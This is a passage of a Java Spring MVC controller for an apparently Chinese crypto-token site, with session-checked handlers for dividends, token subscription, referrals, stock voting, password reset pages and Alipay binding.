	public String fenhong(HttpServletRequest request, HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		if(fhos.getByUid(user.getUid(),"未领取")!=null){
			List<Object> fhlist = fhos.getByUid(user.getUid(),"未领取");
			request.setAttribute("fhlist", fhlist);
		}else{
			request.setAttribute("fhlist", null);
		}
		if(fhos.getByUid(user.getUid())!=null){
			List<Object> fhlistall = fhos.getByUidandDeliverstatus(user.getUid(), "已发放");
			request.setAttribute("fhlistall", fhlistall);
		}else{
			request.setAttribute("fhlistall", null);
		}
		request.setAttribute("userdetail", user);
		return "fenhong";

	}
	
	@RequestMapping(params = "votestock")
	public String votestock(HttpServletRequest request, HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "login";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		List<Object> list = vvs.getVoteStockAllByStatus("已通过");
		Map<Integer,Btc_votehistory> map = bvhs.getHistroyMap(user.getUid());
		request.setAttribute("bvhsmap", map);
		request.setAttribute("votestocklist", list);
		return "votestock";
	}
	
	@RequestMapping(params = "tuijie")
	public String tuijie(HttpServletRequest request, HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "login";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		
		
		List<TuijieViewModel> tvmlist = new ArrayList<TuijieViewModel>();
		if(us.getByInviteName(user.getUusername())!=null){
			List<Object> invitelist = us.getByInviteName(user.getUusername());
			for(int i=0;i<invitelist.size();i++){
				Btc_user iuser = new Btc_user();
				TuijieViewModel tvm = new TuijieViewModel();
				iuser = (Btc_user)invitelist.get(i);
				if(rengous.isRengou(iuser.getUid())){
					tvm.setIsRengou("已进行认购");
				}else{
					tvm.setIsRengou("未认购");
				}
				if(iuser.getUname()!=null){
					tvm.setIsAuthRealName("已进行实名认证");
				}else{
					tvm.setIsAuthRealName("未进行实名认证");
				}
				if(iuser.getUpstate()!=null){
					tvm.setIsGetTGaward("已获得");
				}else{
					tvm.setIsGetTGaward("未获得");
				}
				tvm.setUsdtime(iuser.getUsdtime());
				tvm.setUsername(iuser.getUusername());
				tvm.setUid(iuser.getUid());
				
				BigDecimal rengouget = new BigDecimal(0);
				if(iuser.getRengouget()!=null){
					rengouget = iuser.getRengouget();
				}
				tvm.setRengouget(rengouget);
				tvmlist.add(tvm);
				request.setAttribute("invitelist", tvmlist);
			}
		}
		request.setAttribute("uid", user.getUid());
		return "tuijie";
	}
	
	@RequestMapping(params = "userdetail")
	public String userdetail(HttpServletRequest request, HttpServletResponse response) {
		HttpSession session = request.getSession();
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "login";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		request.setAttribute("userdetail", user);
		return "userdetail";
	}
	
	@RequestMapping(params = "register2")
	public String register2(HttpServletRequest request, HttpServletResponse response) {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "login";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() != null && user.getUcertification() != null) {
			request.setAttribute("msg", "您已进行实名认证！");
			request.setAttribute("href", "index.htm?userdetail");
			return "index";
		}
		return "register2";
	}
	@RequestMapping(params = "Register")
	public String gRegister(ModelMap modelMap,HttpServletRequest request) {
		HttpSession session = request.getSession();
		//#################################################
		if(session.getAttribute("user_amount")==null){
			int user_amount = us.countAllUser();
			session.setAttribute("user_amount", user_amount);
		}
		//###################################################
		return "register";
	}
	
	@RequestMapping(params = "findpass")
	public String findpass(
			@RequestParam("type")String type,
			ModelMap modelMap,HttpServletRequest request) {
		//#################################################
		if(type.equals("upass")){
			request.setAttribute("type", "upass");
		}else{
			request.setAttribute("type", "utpass");
		}
		return "findpass";
	}
	@RequestMapping(params = "resetpass")
	public String resetpass(
			@RequestParam("type")String type,
			ModelMap modelMap,HttpServletRequest request) {
		//#################################################
		if(type.equals("upass")){
			request.setAttribute("type", "upass");
		}else{
			request.setAttribute("type", "utpass");
		}
		return "resetpass";
	}
	@RequestMapping(params = "rengou")
	public String rengou(HttpServletRequest request) throws ParseException {
		HttpSession session = request.getSession();
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "login";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		if(rengous.getLatestRengouconfig()==null){
			request.setAttribute("msg", "对不起，认购还没有开始");
			request.setAttribute("href", "back");
			return "index";
		}
		//给用户显示已购买数量以及能购买总量
		Btc_frc_rengou bfr = new Btc_frc_rengou();
		bfr = rengous.getLatestRengouconfig();
		String season = bfr.getSeason();
		BigDecimal eachget = bfr.getEachamount();
		BigDecimal leftamount = bfr.getAmount();
		BigDecimal userbuyamountlog = rengous.getUserRengouamount(user.getUid(), season);
		BigDecimal usercanbuy = eachget.subtract(userbuyamountlog);
		BigDecimal price = bfr.getPrice();
		RengouViewModel rgvm = new RengouViewModel();
		rgvm.setEachget(eachget);
		rgvm.setLeftamount(leftamount);
		rgvm.setUserbuyamountlog(userbuyamountlog);
		rgvm.setUsercanbuy(usercanbuy);
		rgvm.setPrice(price);
		List<Object> list = rengous.getUserRengouLogList(user.getUid(), season);
		
		request.setAttribute("rgvm", rgvm);
		request.setAttribute("rengoulog", list);
		return "rengou";
	}
	@RequestMapping(params = "factory")
	public String factory(HttpServletRequest request) throws ParseException {
		HttpSession session = request.getSession();
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "login";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		String bflag = "notbuild";
		if(facs.getBtc_join_buildByTime(user.getUid())!=null){
			bflag = "building";
			request.setAttribute("build", facs.getBtc_join_buildByTime(user.getUid()));
		}
		request.setAttribute("bflag", bflag);
		if(facs.getBtc_join_buildByUid(user.getUid())!=null){
			request.setAttribute("buildlog", facs.getBtc_join_buildByUid(user.getUid()));
		}
		Btc_factory bf = gbs.getFactoryConfigByType("果币工厂");
		request.setAttribute("bfconfig", bf);
		return "factory";
	}
	@RequestMapping(params = "game")
	public String game(HttpServletRequest request) throws ParseException {
		return "game";
	}
	@RequestMapping(params = "shop")
	public String shop(HttpServletRequest request) throws ParseException {
		return "shop";
	}
	@RequestMapping(params = "aboutus")
	public String aboutus(HttpServletRequest request) throws ParseException {
		return "aboutus";
	}
	@RequestMapping(params = "faq")
	public String faq(HttpServletRequest request) throws ParseException {
		return "faq";
	}
	@RequestMapping(params = "zhifubao")
	public String zhifubao(HttpServletRequest request) throws ParseException {
		HttpSession session = request.getSession();
		int user_amount = us.countAllUser();
		session.setAttribute("user_amount", user_amount);
		if (session.getAttribute("globaluser") == null) {
			request.setAttribute("msg", "登陆后才能进行此操作！");
			request.setAttribute("href", "index.htm");
			return "index";
		}
		Btc_user user = (Btc_user)session.getAttribute("globaluser");
		if (user.getUname() == null && user.getUcertification() == null) {
			return "register2";
		}
		if(zhis.getZhifubaoByUid(user.getUid())!=null){
			Btc_zhifubao zhi = (Btc_zhifubao)zhis.getZhifubaoByUid(user.getUid()).get(0);
			request.setAttribute("zhi", zhi);
		}
		return "zhifubao";
	}
}
